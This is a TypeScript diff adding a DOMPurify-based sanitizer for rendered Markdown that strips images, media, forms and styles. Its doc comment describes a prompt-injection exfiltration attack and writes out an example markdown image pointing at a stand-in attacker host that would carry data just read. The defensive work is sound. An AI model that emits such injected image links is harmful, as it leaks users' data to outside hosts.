@@ -22,6 +22,36 @@ export function sanitizeHtml(html: string): string {
 }
 
 /**
+ * Sanitize rendered Markdown. On top of `sanitizeHtml` it removes everything
+ * the browser fetches without a click: images, media and CSS in `style`.
+ *
+ * Markdown here is text other people or a model wrote. A model can be told by
+ * the content it reads to append `![](https://attacker/?d=<what it just read>)`,
+ * and the request leaves the moment the answer renders. Links stay, they need
+ * a click.
+ */
+export function sanitizeMarkdownHtml(html: string): string {
+  return DOMPurify.sanitize(html, {
+    USE_PROFILES: { html: true },
+    FORBID_TAGS: [
+      'form',
+      'input',
+      'button',
+      'textarea',
+      'select',
+      'img',
+      'picture',
+      'source',
+      'video',
+      'audio',
+      'track',
+      'style',
+    ],
+    FORBID_ATTR: ['style', 'background', 'poster', 'src', 'srcset'],
+  })
+}
+
+/**
  * Sanitize the inner body of an SVG icon before it is injected into the DOM.
  * Event handlers, `<script>`, `<foreignObject>` and external references are
  * stripped while the drawing primitives are preserved.
